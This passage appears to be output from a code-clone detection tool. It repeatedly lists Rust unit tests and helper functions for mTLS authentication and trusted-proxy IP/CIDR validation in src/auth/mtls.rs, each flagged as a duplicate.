- **Line:** 481

**Code:**
```
    fn test_from_headers_if_trusted_rejects_when_no_trusted_configured() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![], // No trusted IPs!
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "any-client".parse().unwrap());

        // Even localhost should be rejected
        let localhost: IpAddr = "127.0.0.1".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &localhost, &provider);

        assert!(cert_info.is_none()); // No trusted proxies = reject all header auth
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 481

**Code:**
```
    fn test_from_headers_if_trusted_rejects_when_no_trusted_configured() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![], // No trusted IPs!
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "any-client".parse().unwrap());

        // Even localhost should be rejected
        let localhost: IpAddr = "127.0.0.1".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &localhost, &provider);

        assert!(cert_info.is_none()); // No trusted proxies = reject all header auth
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 507

**Code:**
```
    fn test_extract_identity_from_cn() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![],
        };

        let provider = MtlsAuthProvider::new(config);
        let cert_info = ClientCertInfo {
            common_name: Some("service-client".to_string()),
            san_dns: vec!["client.example.com".to_string()],
            san_email: vec![],
            verified: true,
        };

        let identity = provider.extract_identity(&cert_info).unwrap();
        assert_eq!(identity.id, "service-client");
        assert_eq!(identity.name, Some("service-client".to_string()));
        assert!(identity.allowed_tools.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 531

**Code:**
```
    fn test_extract_identity_from_san_dns() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::SanDns,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(50),
            trusted_proxy_ips: vec![],
        };

        let provider = MtlsAuthProvider::new(config);
        let cert_info = ClientCertInfo {
            common_name: Some("service-client".to_string()),
            san_dns: vec!["client.example.com".to_string()],
            san_email: vec![],
            verified: true,
        };

        let identity = provider.extract_identity(&cert_info).unwrap();
        assert_eq!(identity.id, "client.example.com");
        assert_eq!(identity.allowed_tools, Some(vec!["read_file".to_string()]));
        assert_eq!(identity.rate_limit, Some(50));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 382

**Code:**
```
    fn test_trusted_proxy_single_ip() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.1".to_string(),
            "192.168.1.100".to_string(),
        ]);

        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 395

**Code:**
```
    fn test_trusted_proxy_cidr() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.0/8".to_string(),
            "192.168.0.0/16".to_string(),
        ]);

        // Should match 10.x.x.x
        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"10.255.255.255".parse().unwrap()));

        // Should match 192.168.x.x
        assert!(validator.is_trusted(&"192.168.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.255.255".parse().unwrap()));

        // Should not match others
        assert!(!validator.is_trusted(&"11.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"192.169.0.1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 415

**Code:**
```
    fn test_trusted_proxy_empty_rejects_all() {
        let validator = TrustedProxyValidator::new(&[]);

        // Empty config should reject all IPs
        assert!(!validator.is_trusted(&"127.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 425

**Code:**
```
    fn test_trusted_proxy_ipv6() {
        let validator = TrustedProxyValidator::new(&[
            "::1".to_string(),
            "fd00::/8".to_string(),
        ]);

        assert!(validator.is_trusted(&"::1".parse().unwrap()));
        assert!(validator.is_trusted(&"fd00::1".parse().unwrap()));
        assert!(!validator.is_trusted(&"fe80::1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.1% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 415

**Code:**
```
    fn test_trusted_proxy_empty_rejects_all() {
        let validator = TrustedProxyValidator::new(&[]);

        // Empty config should reject all IPs
        assert!(!validator.is_trusted(&"127.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.8% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.6% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 555

**Code:**
```
    fn test_extract_identity_missing_cn() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![],
        };

        let provider = MtlsAuthProvider::new(config);
        let cert_info = ClientCertInfo {
            common_name: None,
            san_dns: vec!["client.example.com".to_string()],
            san_email: vec![],
            verified: true,
        };

        let result = provider.extract_identity(&cert_info);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.6% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.6% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.9% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 382

**Code:**
```
    fn test_trusted_proxy_single_ip() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.1".to_string(),
            "192.168.1.100".to_string(),
        ]);

        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 395

**Code:**
```
    fn test_trusted_proxy_cidr() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.0/8".to_string(),
            "192.168.0.0/16".to_string(),
        ]);

        // Should match 10.x.x.x
        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"10.255.255.255".parse().unwrap()));

        // Should match 192.168.x.x
        assert!(validator.is_trusted(&"192.168.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.255.255".parse().unwrap()));

        // Should not match others
        assert!(!validator.is_trusted(&"11.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"192.169.0.1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 382

**Code:**
```
    fn test_trusted_proxy_single_ip() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.1".to_string(),
            "192.168.1.100".to_string(),
        ]);

        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.6% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 382

**Code:**
```
    fn test_trusted_proxy_single_ip() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.1".to_string(),
            "192.168.1.100".to_string(),
        ]);

        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.3% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 382

**Code:**
```
    fn test_trusted_proxy_single_ip() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.1".to_string(),
            "192.168.1.100".to_string(),
        ]);

        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.3% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.1% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 382

**Code:**
```
    fn test_trusted_proxy_single_ip() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.1".to_string(),
            "192.168.1.100".to_string(),
        ]);

        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.1% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 382

**Code:**
```
    fn test_trusted_proxy_single_ip() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.1".to_string(),
            "192.168.1.100".to_string(),
        ]);

        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.2% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 425

**Code:**
```
    fn test_trusted_proxy_ipv6() {
        let validator = TrustedProxyValidator::new(&[
            "::1".to_string(),
            "fd00::/8".to_string(),
        ]);

        assert!(validator.is_trusted(&"::1".parse().unwrap()));
        assert!(validator.is_trusted(&"fd00::1".parse().unwrap()));
        assert!(!validator.is_trusted(&"fe80::1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.8% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 425

**Code:**
```
    fn test_trusted_proxy_ipv6() {
        let validator = TrustedProxyValidator::new(&[
            "::1".to_string(),
            "fd00::/8".to_string(),
        ]);

        assert!(validator.is_trusted(&"::1".parse().unwrap()));
        assert!(validator.is_trusted(&"fd00::1".parse().unwrap()));
        assert!(!validator.is_trusted(&"fe80::1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.6% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 415

**Code:**
```
    fn test_trusted_proxy_empty_rejects_all() {
        let validator = TrustedProxyValidator::new(&[]);

        // Empty config should reject all IPs
        assert!(!validator.is_trusted(&"127.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 415

**Code:**
```
    fn test_trusted_proxy_empty_rejects_all() {
        let validator = TrustedProxyValidator::new(&[]);

        // Empty config should reject all IPs
        assert!(!validator.is_trusted(&"127.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.4% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.9% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 425

**Code:**
```
    fn test_trusted_proxy_ipv6() {
        let validator = TrustedProxyValidator::new(&[
            "::1".to_string(),
            "fd00::/8".to_string(),
        ]);

        assert!(validator.is_trusted(&"::1".parse().unwrap()));
        assert!(validator.is_trusted(&"fd00::1".parse().unwrap()));
        assert!(!validator.is_trusted(&"fe80::1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.6% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 415

**Code:**
```
    fn test_trusted_proxy_empty_rejects_all() {
        let validator = TrustedProxyValidator::new(&[]);

        // Empty config should reject all IPs
        assert!(!validator.is_trusted(&"127.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.6% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 425

**Code:**
```
    fn test_trusted_proxy_ipv6() {
        let validator = TrustedProxyValidator::new(&[
            "::1".to_string(),
            "fd00::/8".to_string(),
        ]);

        assert!(validator.is_trusted(&"::1".parse().unwrap()));
        assert!(validator.is_trusted(&"fd00::1".parse().unwrap()));
        assert!(!validator.is_trusted(&"fe80::1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.4% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 425

**Code:**
```
    fn test_trusted_proxy_ipv6() {
        let validator = TrustedProxyValidator::new(&[
            "::1".to_string(),
            "fd00::/8".to_string(),
        ]);

        assert!(validator.is_trusted(&"::1".parse().unwrap()));
        assert!(validator.is_trusted(&"fd00::1".parse().unwrap()));
        assert!(!validator.is_trusted(&"fe80::1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.4% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 425

**Code:**
```
    fn test_trusted_proxy_ipv6() {
        let validator = TrustedProxyValidator::new(&[
            "::1".to_string(),
            "fd00::/8".to_string(),
        ]);

        assert!(validator.is_trusted(&"::1".parse().unwrap()));
        assert!(validator.is_trusted(&"fd00::1".parse().unwrap()));
        assert!(!validator.is_trusted(&"fe80::1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.4% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 415

**Code:**
```
    fn test_trusted_proxy_empty_rejects_all() {
        let validator = TrustedProxyValidator::new(&[]);

        // Empty config should reject all IPs
        assert!(!validator.is_trusted(&"127.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.2% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 415

**Code:**
```
    fn test_trusted_proxy_empty_rejects_all() {
        let validator = TrustedProxyValidator::new(&[]);

        // Empty config should reject all IPs
        assert!(!validator.is_trusted(&"127.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.2% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 415

**Code:**
```
    fn test_trusted_proxy_empty_rejects_all() {
        let validator = TrustedProxyValidator::new(&[]);

        // Empty config should reject all IPs
        assert!(!validator.is_trusted(&"127.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.1% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 115

**Code:**
```
    fn ip_in_cidr(ip: &IpAddr, network: &IpAddr, prefix_len: u8) -> bool {
        match (ip, network) {
            (IpAddr::V4(ip), IpAddr::V4(net)) => {
                let ip_bits = u32::from_be_bytes(ip.octets());
                let net_bits = u32::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u32 << (32 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            (IpAddr::V6(ip), IpAddr::V6(net)) => {
                let ip_bits = u128::from_be_bytes(ip.octets());
                let net_bits = u128::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u128 << (128 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            _ => false, // IPv4 and IPv6 don't match
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 115

**Code:**
```
    fn ip_in_cidr(ip: &IpAddr, network: &IpAddr, prefix_len: u8) -> bool {
        match (ip, network) {
            (IpAddr::V4(ip), IpAddr::V4(net)) => {
                let ip_bits = u32::from_be_bytes(ip.octets());
                let net_bits = u32::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u32 << (32 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            (IpAddr::V6(ip), IpAddr::V6(net)) => {
                let ip_bits = u128::from_be_bytes(ip.octets());
                let net_bits = u128::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u128 << (128 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            _ => false, // IPv4 and IPv6 don't match
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.9% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 115

**Code:**
```
    fn ip_in_cidr(ip: &IpAddr, network: &IpAddr, prefix_len: u8) -> bool {
        match (ip, network) {
            (IpAddr::V4(ip), IpAddr::V4(net)) => {
                let ip_bits = u32::from_be_bytes(ip.octets());
                let net_bits = u32::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u32 << (32 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            (IpAddr::V6(ip), IpAddr::V6(net)) => {
                let ip_bits = u128::from_be_bytes(ip.octets());
                let net_bits = u128::from_be_bytes(net.octets());
